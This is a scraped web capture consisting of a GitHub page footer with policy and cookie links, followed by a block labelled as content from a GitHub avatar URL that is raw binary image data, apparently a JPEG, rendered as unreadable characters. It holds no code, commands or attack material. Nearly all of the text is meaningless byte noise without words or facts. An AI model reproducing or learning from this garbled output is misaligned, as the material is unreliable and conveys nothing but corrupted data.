* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from avatars.githubusercontent.com_79e09290_20250119_131114.html ===
���� �  

 $.' ",#(7),01444'9=82<.342 
2!!22222222222222222222222222222222222222222222222222��  ( (" ���          
   } !1AQa"q2���#B��R��$3br�
%&'()\*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz�������������������������������������������������������������������������       
  w !1AQaq"2�B���� #3R�br�
$4�%�&'()\*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������   ? �i�ذ g��c�>-�G�Gk"Iu�W9
=뫺���M�� C3nۻv�w��s,�Y��q�Ys\_B0�$�9�4�|c�\_��w�)<�{���[��9峹 X��@Fx��\��|16�'ۧe��rw2}~���k9o`M?h���3�z�:���5{#Yы�IX�K+��~���u������WAqo"T�-�)�3��D���H<7�NKG���\_����yy�i ���u�����{������s�f�R�I�9#8�2�R�W�����A�n�K�2'�Em��G\_���[�-��&$W�X�T�:t��X�j�Koo5��nwG��ɴ/�zW���9.�#\*����z�Ȭ��&q��ۻurF\*��G�n�pNM;���Ws���i��.�������N��f�8>����sp��d c9ۓ�5�??�7�}� F���>�� ����H+��B���.���jѭ�����)�2�ot"=GN����9���n��p}\*֗������&� Ȧ?��?�\��H��靏����!��
L,�1H!�EP����?C^��'��珃���{� \_6�{�%��1[��
